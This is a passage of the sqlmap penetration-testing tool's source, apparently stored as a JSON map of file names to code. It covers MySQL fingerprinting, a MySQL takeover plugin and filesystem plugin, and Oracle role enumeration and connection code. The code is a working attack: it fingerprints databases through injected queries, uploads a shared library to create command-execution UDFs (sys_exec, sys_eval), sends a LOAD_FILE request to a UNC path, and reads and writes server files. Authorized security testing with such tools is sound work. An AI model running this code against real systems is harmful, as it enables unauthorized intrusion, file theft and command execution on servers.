hashDBWrite(HASHDB_KEYS.DBMS_FORK, fork)\n\n        value = \"\"\n        wsOsFp = Format.getOs(\"web server\", kb.headersFp)\n\n        if wsOsFp and not conf.api:\n            value += \"%s\\n\" % wsOsFp\n\n        if kb.data.banner:\n            dbmsOsFp = Format.getOs(\"back-end DBMS\", kb.bannerFp)\n\n            if dbmsOsFp and not conf.api:\n                value += \"%s\\n\" % dbmsOsFp\n\n        value += \"back-end DBMS: \"\n        actVer = Format.getDbms()\n\n        if not conf.extensiveFp:\n            value += actVer\n            if fork:\n                value += \" (%s fork)\" % fork\n            return value\n\n        comVer = self._commentCheck()\n        blank = \" \" * 15\n        value += \"active fingerprint: %s\" % actVer\n\n        if comVer:\n            comVer = Format.getDbms([comVer])\n            value += \"\\n%scomment injection fingerprint: %s\" % (blank, comVer)\n\n        if kb.bannerFp:\n            banVer = kb.bannerFp.get(\"dbmsVersion\")\n\n            if banVer:\n                if banVer and re.search(r\"-log$\", kb.data.banner or \"\"):\n                    banVer += \", logging enabled\"\n\n                banVer = Format.getDbms([banVer])\n                value += \"\\n%sbanner parsing fingerprint: %s\" % (blank, banVer)\n\n        htmlErrorFp = Format.getErrorParsedDBMSes()\n\n        if htmlErrorFp:\n            value += \"\\n%shtml error message fingerprint: %s\" % (blank, htmlErrorFp)\n\n        if fork:\n            value += \"\\n%sfork fingerprint: %s\" % (blank, fork)\n\n        return value\n\n    def checkDbms(self):\n        \"\"\"\n        References for fingerprint:\n\n        * http://dev.mysql.com/doc/refman/5.0/en/news-5-0-x.html (up to 5.0.89)\n        * http://dev.mysql.com/doc/refman/5.1/en/news-5-1-x.html (up to 5.1.42)\n        * http://dev.mysql.com/doc/refman/5.4/en/news-5-4-x.html (up to 5.4.4)\n        * http://dev.mysql.com/doc/refman/5.5/en/news-5-5-x.html (up to 5.5.0)\n        * http://dev.mysql.com/doc/refman/6.0/en/news-6-0-x.html (manual has been withdrawn)\n        \"\"\"\n\n        if not conf.extensiveFp and Backend.isDbmsWithin(MYSQL_ALIASES):\n            setDbms(\"%s %s\" % (DBMS.MYSQL, Backend.getVersion()))\n\n            if Backend.isVersionGreaterOrEqualThan(\"5\") or inject.checkBooleanExpression(\"DATABASE() LIKE SCHEMA()\"):\n                kb.data.has_information_schema = True\n            self.getBanner()\n\n            return True\n\n        infoMsg = \"testing %s\" % DBMS.MYSQL\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"QUARTER(NULL XOR NULL) IS NULL\")\n\n        if result:\n            infoMsg = \"confirming %s\" % DBMS.MYSQL\n            logger.info(infoMsg)\n\n            result = inject.checkBooleanExpression(\"SESSION_USER() LIKE USER()\")\n\n            if not result:\n                # Note: MemSQL doesn't support SESSION_USER()\n                result = inject.checkBooleanExpression(\"GEOGRAPHY_AREA(NULL) IS NULL\")\n\n                if result:\n                    hashDBWrite(HASHDB_KEYS.DBMS_FORK, FORK.MEMSQL)\n\n            if not result:\n                warnMsg = \"the back-end DBMS is not %s\" % DBMS.MYSQL\n                logger.warning(warnMsg)\n\n                return False\n\n            # reading information_schema on some platforms is causing annoying timeout exits\n            # Reference: http://bugs.mysql.com/bug.php?id=15855\n\n            kb.data.has_information_schema = True\n\n            # Determine if it is MySQL >= 8.0.0\n            if inject.checkBooleanExpression(\"ISNULL(JSON_STORAGE_FREE(NULL))\"):\n                Backend.setVersion(\">= 8.0.0\")\n                setDbms(\"%s 8\" % DBMS.MYSQL)\n                self.getBanner()\n\n            # Determine if it is MySQL >= 5.0.0\n            elif inject.checkBooleanExpression(\"ISNULL(TIMESTAMPADD(MINUTE,[RANDNUM],NULL))\"):\n                Backend.setVersion(\">= 5.0.0\")\n                setDbms(\"%s 5\" % DBMS.MYSQL)\n                self.getBanner()\n\n                if not conf.extensiveFp:\n                    return True\n\n                infoMsg = \"actively fingerprinting %s\" % DBMS.MYSQL\n                logger.info(infoMsg)\n\n                # Check if it is MySQL >= 5.7\n                if inject.checkBooleanExpression(\"ISNULL(JSON_QUOTE(NULL))\"):\n                    Backend.setVersion(\">= 5.7\")\n\n                # Check if it is MySQL >= 5.6\n                elif inject.checkBooleanExpression(\"ISNULL(VALIDATE_PASSWORD_STRENGTH(NULL))\"):\n                    Backend.setVersion(\">= 5.6\")\n\n                # Check if it is MySQL >= 5.5\n                elif inject.checkBooleanExpression(\"TO_SECONDS(950501)>0\"):\n                    Backend.setVersion(\">= 5.5\")\n\n                # Check if it is MySQL >= 5.1.2 and < 5.5.0\n                elif inject.checkBooleanExpression(\"@@table_open_cache=@@table_open_cache\"):\n                    if inject.checkBooleanExpression(\"[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.GLOBAL_STATUS LIMIT 0, 1)\"):\n                        Backend.setVersionList([\">= 5.1.12\", \"< 5.5.0\"])\n                    elif inject.checkBooleanExpression(\"[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PROCESSLIST LIMIT 0, 1)\"):\n                        Backend.setVersionList([\">= 5.1.7\", \"< 5.1.12\"])\n                    elif inject.checkBooleanExpression(\"[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PARTITIONS LIMIT 0, 1)\"):\n                        Backend.setVersion(\"= 5.1.6\")\n                    elif inject.checkBooleanExpression(\"[RANDNUM]=(SELECT [RANDNUM] FROM information_schema.PLUGINS LIMIT 0, 1)\"):\n                        Backend.setVersionList([\">= 5.1.5\", \"< 5.1.6\"])\n                    else:\n                        Backend.setVersionList([\">= 5.1.2\", \"< 5.1.5\"])\n\n                # Check if it is MySQL >= 5.0.0 and < 5.1.2\n                elif inject.checkBooleanExpression(\"@@hostname=@@hostname\"):\n                    Backend.setVersionList([\">= 5.0.38\", \"< 5.1.2\"])\n                elif inject.checkBooleanExpression(\"@@character_set_filesystem=@@character_set_filesystem\"):\n                    Backend.setVersionList([\">= 5.0.19\", \"< 5.0.38\"])\n                elif not inject.checkBooleanExpression(\"[RANDNUM]=(SELECT [RANDNUM] FROM DUAL WHERE [RANDNUM1]!=[RANDNUM2])\"):\n                    Backend.setVersionList([\">= 5.0.11\", \"< 5.0.19\"])\n                elif inject.checkBooleanExpression(\"@@div_precision_increment=@@div_precision_increment\"):\n                    Backend.setVersionList([\">= 5.0.6\", \"< 5.0.11\"])\n                elif inject.checkBooleanExpression(\"@@automatic_sp_privileges=@@automatic_sp_privileges\"):\n                    Backend.setVersionList([\">= 5.0.3\", \"< 5.0.6\"])\n                else:\n                    Backend.setVersionList([\">= 5.0.0\", \"< 5.0.3\"])\n\n            elif inject.checkBooleanExpression(\"DATABASE() LIKE SCHEMA()\"):\n                Backend.setVersion(\">= 5.0.2\")\n                setDbms(\"%s 5\" % DBMS.MYSQL)\n                self.getBanner()\n\n            elif inject.checkBooleanExpression(\"STRCMP(LOWER(CURRENT_USER()), UPPER(CURRENT_USER()))=0\"):\n                Backend.setVersion(\"< 5.0.0\")\n                setDbms(\"%s 4\" % DBMS.MYSQL)\n                self.getBanner()\n\n                kb.data.has_information_schema = False\n\n                if not conf.extensiveFp:\n                    return True\n\n                # Check which version of MySQL < 5.0.0 it is\n                if inject.checkBooleanExpression(\"3=(SELECT COERCIBILITY(USER()))\"):\n                    Backend.setVersionList([\">= 4.1.11\", \"< 5.0.0\"])\n                elif inject.checkBooleanExpression(\"2=(SELECT COERCIBILITY(USER()))\"):\n                    Backend.setVersionList([\">= 4.1.1\", \"< 4.1.11\"])\n                elif inject.checkBooleanExpression(\"CURRENT_USER()=CURRENT_USER()\"):\n                    Backend.setVersionList([\">= 4.0.6\", \"< 4.1.1\"])\n\n                    if inject.checkBooleanExpression(\"'utf8'=(SELECT CHARSET(CURRENT_USER()))\"):\n                        Backend.setVersion(\"= 4.1.0\")\n                    else:\n                        Backend.setVersionList([\">= 4.0.6\", \"< 4.1.0\"])\n                else:\n                    Backend.setVersionList([\">= 4.0.0\", \"< 4.0.6\"])\n            else:\n                Backend.setVersion(\"< 4.0.0\")\n                setDbms(\"%s 3\" % DBMS.MYSQL)\n                self.getBanner()\n\n                kb.data.has_information_schema = False\n\n            return True\n        else:\n            warnMsg = \"the back-end DBMS is not %s\" % DBMS.MYSQL\n            logger.warning(warnMsg)\n\n            return False\n\n    def checkDbmsOs(self, detailed=False):\n        if Backend.getOs():\n            return\n\n        infoMsg = \"fingerprinting the back-end DBMS operating system\"\n        logger.info(infoMsg)\n\n        result = inject.checkBooleanExpression(\"'W'=UPPER(MID(@@version_compile_os,1,1))\")\n\n        if result:\n            Backend.setOs(OS.WINDOWS)\n        elif not result:\n            Backend.setOs(OS.LINUX)\n\n        if Backend.getOs():\n            infoMsg = \"the back-end DBMS operating system is %s\" % Backend.getOs()\n            logger.info(infoMsg)\n        else:\n            self.userChooseDbmsOs()\n\n        self.cleanup(onlyFileTbl=True)\n", "plugins/dbms/mysql/takeover.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nimport os\n\nfrom lib.core.agent import agent\nfrom lib.core.common import Backend\nfrom lib.core.common import decloakToTemp\nfrom lib.core.common import isStackingAvailable\nfrom lib.core.common import isWindowsDriveLetterPath\nfrom lib.core.common import normalizePath\nfrom lib.core.common import ntToPosixSlashes\nfrom lib.core.common import randomStr\nfrom lib.core.common import unArrayizeValue\nfrom lib.core.compat import LooseVersion\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import paths\nfrom lib.core.enums import OS\nfrom lib.request import inject\nfrom lib.request.connect import Connect as Request\nfrom plugins.generic.takeover import Takeover as GenericTakeover\n\nclass Takeover(GenericTakeover):\n    def __init__(self):\n        self.__basedir = None\n        self.__datadir = None\n        self.__plugindir = None\n\n        GenericTakeover.__init__(self)\n\n    def udfSetRemotePath(self):\n        self.getVersionFromBanner()\n\n        banVer = kb.bannerFp[\"dbmsVersion\"]\n\n        if banVer and LooseVersion(banVer) >= LooseVersion(\"5.0.67\"):\n            if self.__plugindir is None:\n                logger.info(\"retrieving MySQL plugin directory absolute path\")\n                self.__plugindir = unArrayizeValue(inject.getValue(\"SELECT @@plugin_dir\"))\n\n            # On MySQL 5.1 >= 5.1.19 and on any version of MySQL 6.0\n            if self.__plugindir is None and LooseVersion(banVer) >= LooseVersion(\"5.1.19\"):\n                logger.info(\"retrieving MySQL base directory absolute path\")\n\n                # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_basedir\n                self.__basedir = unArrayizeValue(inject.getValue(\"SELECT @@basedir\"))\n\n                if isWindowsDriveLetterPath(self.__basedir or \"\"):\n                    Backend.setOs(OS.WINDOWS)\n                else:\n                    Backend.setOs(OS.LINUX)\n\n                # The DLL must be in C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin\n                if Backend.isOs(OS.WINDOWS):\n                    self.__plugindir = \"%s/lib/plugin\" % self.__basedir\n                else:\n                    self.__plugindir = \"%s/lib/mysql/plugin\" % self.__basedir\n\n            self.__plugindir = ntToPosixSlashes(normalizePath(self.__plugindir)) or '.'\n\n            self.udfRemoteFile = \"%s/%s.%s\" % (self.__plugindir, self.udfSharedLibName, self.udfSharedLibExt)\n\n        # On MySQL 4.1 < 4.1.25 and on MySQL 4.1 >= 4.1.25 with NO plugin_dir set in my.ini configuration file\n        # On MySQL 5.0 < 5.0.67 and on MySQL 5.0 >= 5.0.67 with NO plugin_dir set in my.ini configuration file\n        else:\n            # logger.debug(\"retrieving MySQL data directory absolute path\")\n\n            # Reference: http://dev.mysql.com/doc/refman/5.1/en/server-options.html#option_mysqld_datadir\n            # self.__datadir = inject.getValue(\"SELECT @@datadir\")\n\n            # NOTE: specifying the relative path as './udf.dll'\n            # saves in @@datadir on both MySQL 4.1 and MySQL 5.0\n            self.__datadir = '.'\n            self.__datadir = ntToPosixSlashes(normalizePath(self.__datadir))\n\n            # The DLL can be in either C:\\WINDOWS, C:\\WINDOWS\\system,\n            # C:\\WINDOWS\\system32, @@basedir\\bin or @@datadir\n            self.udfRemoteFile = \"%s/%s.%s\" % (self.__datadir, self.udfSharedLibName, self.udfSharedLibExt)\n\n    def udfSetLocalPaths(self):\n        self.udfLocalFile = paths.SQLMAP_UDF_PATH\n        self.udfSharedLibName = \"libs%s\" % randomStr(lowercase=True)\n\n        if Backend.isOs(OS.WINDOWS):\n            _ = os.path.join(self.udfLocalFile, \"mysql\", \"windows\", \"%d\" % Backend.getArch(), \"lib_mysqludf_sys.dll_\")\n            self.udfLocalFile = decloakToTemp(_)\n            self.udfSharedLibExt = \"dll\"\n        else:\n            _ = os.path.join(self.udfLocalFile, \"mysql\", \"linux\", \"%d\" % Backend.getArch(), \"lib_mysqludf_sys.so_\")\n            self.udfLocalFile = decloakToTemp(_)\n            self.udfSharedLibExt = \"so\"\n\n    def udfCreateFromSharedLib(self, udf, inpRet):\n        if udf in self.udfToCreate:\n            logger.info(\"creating UDF '%s' from the binary UDF file\" % udf)\n\n            ret = inpRet[\"return\"]\n\n            # Reference: http://dev.mysql.com/doc/refman/5.1/en/create-function-udf.html\n            inject.goStacked(\"DROP FUNCTION %s\" % udf)\n            inject.goStacked(\"CREATE FUNCTION %s RETURNS %s SONAME '%s.%s'\" % (udf, ret, self.udfSharedLibName, self.udfSharedLibExt))\n\n            self.createdUdf.add(udf)\n        else:\n            logger.debug(\"keeping existing UDF '%s' as requested\" % udf)\n\n    def uncPathRequest(self):\n        if not isStackingAvailable():\n            query = agent.prefixQuery(\"AND LOAD_FILE('%s')\" % self.uncPath)\n            query = agent.suffixQuery(query)\n            payload = agent.payload(newValue=query)\n\n            Request.queryPage(payload)\n        else:\n            inject.goStacked(\"SELECT LOAD_FILE('%s')\" % self.uncPath, silent=True)\n", "plugins/dbms/mysql/filesystem.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.agent import agent\nfrom lib.core.common import getSQLSnippet\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.common import popValue\nfrom lib.core.common import pushValue\nfrom lib.core.common import randomStr\nfrom lib.core.common import singleTimeWarnMessage\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.decorators import stackedmethod\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.enums import PLACE\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.request import inject\nfrom lib.request.connect import Connect as Request\nfrom lib.techniques.union.use import unionUse\nfrom plugins.generic.filesystem import Filesystem as GenericFilesystem\n\nclass Filesystem(GenericFilesystem):\n    def nonStackedReadFile(self, rFile):\n        if not kb.bruteMode:\n            infoMsg = \"fetching file: '%s'\" % rFile\n            logger.info(infoMsg)\n\n        result = inject.getValue(\"HEX(LOAD_FILE('%s'))\" % rFile, charsetType=CHARSET_TYPE.HEXADECIMAL)\n\n        return result\n\n    def stackedReadFile(self, remoteFile):\n        if not kb.bruteMode:\n            infoMsg = \"fetching file: '%s'\" % remoteFile\n            logger.info(infoMsg)\n\n        self.createSupportTbl(self.fileTblName, self.tblField, \"longtext\")\n        self.getRemoteTempPath()\n\n        tmpFile = \"%s/tmpf%s\" % (conf.tmpPath, randomStr(lowercase=True))\n\n        debugMsg = \"saving hexadecimal encoded content of file '%s' \" % remoteFile\n        debugMsg += \"into temporary file '%s'\" % tmpFile\n        logger.debug(debugMsg)\n        inject.goStacked(\"SELECT HEX(LOAD_FILE('%s')) INTO DUMPFILE '%s'\" % (remoteFile, tmpFile))\n\n        debugMsg = \"loading the content of hexadecimal encoded file \"\n        debugMsg += \"'%s' into support table\" % remoteFile\n        logger.debug(debugMsg)\n        inject.goStacked(\"LOAD DATA INFILE '%s' INTO TABLE %s FIELDS TERMINATED BY '%s' (%s)\" % (tmpFile, self.fileTblName, randomStr(10), self.tblField))\n\n        length = inject.getValue(\"SELECT LENGTH(%s) FROM %s\" % (self.tblField, self.fileTblName), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n        if not isNumPosStrValue(length):\n            warnMsg = \"unable to retrieve the content of the \"\n            warnMsg += \"file '%s'\" % remoteFile\n\n            if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):\n                if not kb.bruteMode:\n                    warnMsg += \", going to fall-back to simpler UNION technique\"\n                    logger.warning(warnMsg)\n                result = self.nonStackedReadFile(remoteFile)\n            else:\n                raise SqlmapNoneDataException(warnMsg)\n        else:\n            length = int(length)\n            chunkSize = 1024\n\n            if length > chunkSize:\n                result = []\n\n                for i in xrange(1, length, chunkSize):\n                    chunk = inject.getValue(\"SELECT MID(%s, %d, %d) FROM %s\" % (self.tblField, i, chunkSize, self.fileTblName), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)\n                    result.append(chunk)\n            else:\n                result = inject.getValue(\"SELECT %s FROM %s\" % (self.tblField, self.fileTblName), resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)\n\n        return result\n\n    @stackedmethod\n    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):\n        logger.debug(\"encoding file to its hexadecimal string value\")\n\n        fcEncodedList = self.fileEncode(localFile, \"hex\", True)\n        fcEncodedStr = fcEncodedList[0]\n        fcEncodedStrLen = len(fcEncodedStr)\n\n        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:\n            warnMsg = \"as the injection is on a GET parameter and the file \"\n            warnMsg += \"to be written hexadecimal value is %d \" % fcEncodedStrLen\n            warnMsg += \"bytes, this might cause errors in the file \"\n            warnMsg += \"writing process\"\n            logger.warning(warnMsg)\n\n        debugMsg = \"exporting the %s file content to file '%s'\" % (fileType, remoteFile)\n        logger.debug(debugMsg)\n\n        pushValue(kb.forceWhere)\n        kb.forceWhere = PAYLOAD.WHERE.NEGATIVE\n        sqlQuery = \"%s INTO DUMPFILE '%s'\" % (fcEncodedStr, remoteFile)\n        unionUse(sqlQuery, unpack=False)\n        kb.forceWhere = popValue()\n\n        warnMsg = \"expect junk characters inside the \"\n        warnMsg += \"file as a leftover from UNION query\"\n        singleTimeWarnMessage(warnMsg)\n\n        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)\n\n    def linesTerminatedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):\n        logger.debug(\"encoding file to its hexadecimal string value\")\n\n        fcEncodedList = self.fileEncode(localFile, \"hex\", True)\n        fcEncodedStr = fcEncodedList[0][2:]\n        fcEncodedStrLen = len(fcEncodedStr)\n\n        if kb.injection.place == PLACE.GET and fcEncodedStrLen > 8000:\n            warnMsg = \"the injection is on a GET parameter and the file \"\n            warnMsg += \"to be written hexadecimal value is %d \" % fcEncodedStrLen\n            warnMsg += \"bytes, this might cause errors in the file \"\n            warnMsg += \"writing process\"\n            logger.warning(warnMsg)\n\n        debugMsg = \"exporting the %s file content to file '%s'\" % (fileType, remoteFile)\n        logger.debug(debugMsg)\n\n        query = getSQLSnippet(DBMS.MYSQL, \"write_file_limit\", OUTFILE=remoteFile, HEXSTRING=fcEncodedStr)\n        query = agent.prefixQuery(query)        # Note: No need for suffix as 'write_file_limit' already ends with comment (required)\n        payload = agent.payload(newValue=query)\n        Request.queryPage(payload, content=False, raise404=False, silent=True, noteResponseTime=False)\n\n        warnMsg = \"expect junk characters inside the \"\n        warnMsg += \"file as a leftover from original query\"\n        singleTimeWarnMessage(warnMsg)\n\n        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)\n\n    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):\n        debugMsg = \"creating a support table to write the hexadecimal \"\n        debugMsg += \"encoded file to\"\n        logger.debug(debugMsg)\n\n        self.createSupportTbl(self.fileTblName, self.tblField, \"longblob\")\n\n        logger.debug(\"encoding file to its hexadecimal string value\")\n        fcEncodedList = self.fileEncode(localFile, \"hex\", False)\n\n        debugMsg = \"forging SQL statements to write the hexadecimal \"\n        debugMsg += \"encoded file to the support table\"\n        logger.debug(debugMsg)\n\n        sqlQueries = self.fileToSqlQueries(fcEncodedList)\n\n        logger.debug(\"inserting the hexadecimal encoded file to the support table\")\n\n        inject.goStacked(\"SET GLOBAL max_allowed_packet = %d\" % (1024 * 1024))  # 1MB (Note: https://github.com/sqlmapproject/sqlmap/issues/3230)\n\n        for sqlQuery in sqlQueries:\n            inject.goStacked(sqlQuery)\n\n        debugMsg = \"exporting the %s file content to file '%s'\" % (fileType, remoteFile)\n        logger.debug(debugMsg)\n\n        # Reference: http://dev.mysql.com/doc/refman/5.1/en/select.html\n        inject.goStacked(\"SELECT %s FROM %s INTO DUMPFILE '%s'\" % (self.tblField, self.fileTblName, remoteFile), silent=True)\n\n        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)\n", "plugins/dbms/mysql/__init__.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.enums import DBMS\nfrom lib.core.settings import MYSQL_SYSTEM_DBS\nfrom lib.core.unescaper import unescaper\nfrom plugins.dbms.mysql.enumeration import Enumeration\nfrom plugins.dbms.mysql.filesystem import Filesystem\nfrom plugins.dbms.mysql.fingerprint import Fingerprint\nfrom plugins.dbms.mysql.syntax import Syntax\nfrom plugins.dbms.mysql.takeover import Takeover\nfrom plugins.generic.misc import Miscellaneous\n\nclass MySQLMap(Syntax, Fingerprint, Enumeration, Filesystem, Miscellaneous, Takeover):\n    \"\"\"\n    This class defines MySQL methods\n    \"\"\"\n\n    def __init__(self):\n        self.excludeDbsList = MYSQL_SYSTEM_DBS\n        self.sysUdfs = {\n            # UDF name: UDF return data-type\n            \"sys_exec\": {\"return\": \"int\"},\n            \"sys_eval\": {\"return\": \"string\"},\n            \"sys_bineval\": {\"return\": \"int\"}\n        }\n\n        for cls in self.__class__.__bases__:\n            cls.__init__(self)\n\n    unescaper[DBMS.MYSQL] = Syntax.escape\n", "plugins/dbms/oracle/enumeration.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom lib.core.common import getLimitRange\nfrom lib.core.common import isAdminFromPrivileges\nfrom lib.core.common import isInferenceAvailable\nfrom lib.core.common import isNoneValue\nfrom lib.core.common import isNumPosStrValue\nfrom lib.core.common import isTechniqueAvailable\nfrom lib.core.compat import xrange\nfrom lib.core.data import conf\nfrom lib.core.data import kb\nfrom lib.core.data import logger\nfrom lib.core.data import queries\nfrom lib.core.enums import CHARSET_TYPE\nfrom lib.core.enums import DBMS\nfrom lib.core.enums import EXPECTED\nfrom lib.core.enums import PAYLOAD\nfrom lib.core.exception import SqlmapNoneDataException\nfrom lib.core.settings import CURRENT_USER\nfrom lib.request import inject\nfrom plugins.generic.enumeration import Enumeration as GenericEnumeration\n\nclass Enumeration(GenericEnumeration):\n    def getRoles(self, query2=False):\n        infoMsg = \"fetching database users roles\"\n\n        rootQuery = queries[DBMS.ORACLE].roles\n\n        if conf.user == CURRENT_USER:\n            infoMsg += \" for current user\"\n            conf.user = self.getCurrentUser()\n\n        logger.info(infoMsg)\n\n        # Set containing the list of DBMS administrators\n        areAdmins = set()\n\n        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:\n            if query2:\n                query = rootQuery.inband.query2\n                condition = rootQuery.inband.condition2\n            else:\n                query = rootQuery.inband.query\n                condition = rootQuery.inband.condition\n\n            if conf.user:\n                users = conf.user.split(',')\n                query += \" WHERE \"\n                query += \" OR \".join(\"%s = '%s'\" % (condition, user) for user in sorted(users))\n\n            values = inject.getValue(query, blind=False, time=False)\n\n            if not values and not query2:\n                infoMsg = \"trying with table 'USER_ROLE_PRIVS'\"\n                logger.info(infoMsg)\n\n                return self.getRoles(query2=True)\n\n            if not isNoneValue(values):\n                for value in values:\n                    user = None\n                    roles = set()\n\n                    for count in xrange(0, len(value or [])):\n                        # The first column is always the username\n                        if count == 0:\n                            user = value[count]\n\n                        # The other columns are the roles\n                        else:\n                            role = value[count]\n\n                            # In Oracle we get the list of roles as string\n                            roles.add(role)\n\n                    if user in kb.data.cachedUsersRoles:\n                        kb.data.cachedUsersRoles[user] = list(roles.union(kb.data.cachedUsersRoles[user]))\n                    else:\n                        kb.data.cachedUsersRoles[user] = list(roles)\n\n        if not kb.data.cachedUsersRoles and isInferenceAvailable() and not conf.direct:\n            if conf.user:\n                users = conf.user.split(',')\n            else:\n                if not len(kb.data.cachedUsers):\n                    users = self.getUsers()\n                else:\n                    users = kb.data.cachedUsers\n\n            retrievedUsers = set()\n\n            for user in users:\n                unescapedUser = None\n\n                if user in retrievedUsers:\n                    continue\n\n                infoMsg = \"fetching number of roles \"\n                infoMsg += \"for user '%s'\" % user\n                logger.info(infoMsg)\n\n                if unescapedUser:\n                    queryUser = unescapedUser\n                else:\n                    queryUser = user\n\n                if query2:\n                    query = rootQuery.blind.count2 % queryUser\n                else:\n                    query = rootQuery.blind.count % queryUser\n                count = inject.getValue(query, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)\n\n                if not isNumPosStrValue(count):\n                    if count != 0 and not query2:\n                        infoMsg = \"trying with table 'USER_SYS_PRIVS'\"\n                        logger.info(infoMsg)\n\n                        return self.getPrivileges(query2=True)\n\n                    warnMsg = \"unable to retrieve the number of \"\n                    warnMsg += \"roles for user '%s'\" % user\n                    logger.warning(warnMsg)\n                    continue\n\n                infoMsg = \"fetching roles for user '%s'\" % user\n                logger.info(infoMsg)\n\n                roles = set()\n\n                indexRange = getLimitRange(count, plusOne=True)\n\n                for index in indexRange:\n                    if query2:\n                        query = rootQuery.blind.query2 % (queryUser, index)\n                    else:\n                        query = rootQuery.blind.query % (queryUser, index)\n                    role = inject.getValue(query, union=False, error=False)\n\n                    # In Oracle we get the list of roles as string\n                    roles.add(role)\n\n                if roles:\n                    kb.data.cachedUsersRoles[user] = list(roles)\n                else:\n                    warnMsg = \"unable to retrieve the roles \"\n                    warnMsg += \"for user '%s'\" % user\n                    logger.warning(warnMsg)\n\n                retrievedUsers.add(user)\n\n        if not kb.data.cachedUsersRoles:\n            errMsg = \"unable to retrieve the roles \"\n            errMsg += \"for the database users\"\n            raise SqlmapNoneDataException(errMsg)\n\n        for user, privileges in kb.data.cachedUsersRoles.items():\n            if isAdminFromPrivileges(privileges):\n                areAdmins.add(user)\n\n        return kb.data.cachedUsersRoles, areAdmins\n", "plugins/dbms/oracle/connector.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\ntry:\n    import cx_Oracle\nexcept:\n    pass\n\nimport logging\nimport os\nimport re\n\nfrom lib.core.common import getSafeExString\nfrom lib.core.convert import getText\nfrom lib.core.data import conf\nfrom lib.core.data import logger\nfrom lib.core.exception import SqlmapConnectionException\nfrom plugins.generic.connector import Connector as GenericConnector\n\nos.environ[\"NLS_LANG\"] = \".AL32UTF8\"\n\nclass Connector(GenericConnector):\n    \"\"\"\n    Homepage: https://oracle.github.io/python-cx_Oracle/\n    User https://cx-oracle.readthedocs.io/en/latest/\n    API: https://wiki.python.org/moin/DatabaseProgramming\n    License: https://cx-oracle.readthedocs.io/en/latest/license.html#license\n    \"\"\"\n\n    def connect(self):\n        self.initConnection()\n        self.__dsn = cx_Oracle.makedsn(self.hostname, self.port, self.db)\n        self.__dsn = getText(self.__dsn)\n        self.user = getText(self.user)\n        self.password = getText(self.password)\n\n        try:\n            self.connector = cx_Oracle.connect(dsn=self.__dsn, user=self.user, password=self.password, mode=cx_Oracle.SYSDBA)\n            logger.info(\"successfully connected as SYSDBA\")\n        except (cx_Oracle.OperationalError, cx_Oracle.DatabaseError, cx_Oracle.InterfaceError) as ex:\n            if \"Oracle Client library\" in getSafeExString(ex):\n                msg = re.sub(r\"DPI-\\d+:\\s+\", \"\", getSafeExString(ex))\n                msg = re.sub(r': (\"[^\"]+\")', r\" (\\g<1>)\", msg)\n                msg = re.sub(r\". See (http[^ ]+)\", r'. See \"\\g<1>\"', msg)\n                raise SqlmapConnectionException(msg)\n\n            try:\n                self.connector = cx_Oracle.connect(dsn=self.__dsn, user=self.user, password=self.password)\n            except (cx_Oracle.OperationalError, cx_Oracle.DatabaseError, cx_Oracle.InterfaceError) as ex:\n                raise SqlmapConnectionException(ex)\n\n        self.initCursor()\n        self.printConnected()\n\n    def fetchall(self):\n        try:\n            return self.cursor.fetchall()\n        except cx_Oracle.InterfaceError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n            return None\n\n    def execute(self, query):\n        retVal = False\n\n        try:\n            self.cursor.execute(getText(query))\n            retVal = True\n        except cx_Oracle.DatabaseError as ex:\n            logger.log(logging.WARN if conf.dbmsHandler else logging.DEBUG, \"(remote) '%s'\" % getSafeExString(ex))\n\n        self.connector.commit()\n\n        return retVal\n\n    def select(self, query):\n        retVal = None\n\n        if self.execute(query):\n            retVal = self.fetchall()\n\n        return retVal\n", "plugins/dbms/oracle/syntax.py": "#!/usr/bin/env python\n\n\"\"\"\nCopyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)\nSee the file 'LICENSE' for copying permission\n\"\"\"\n\nfrom 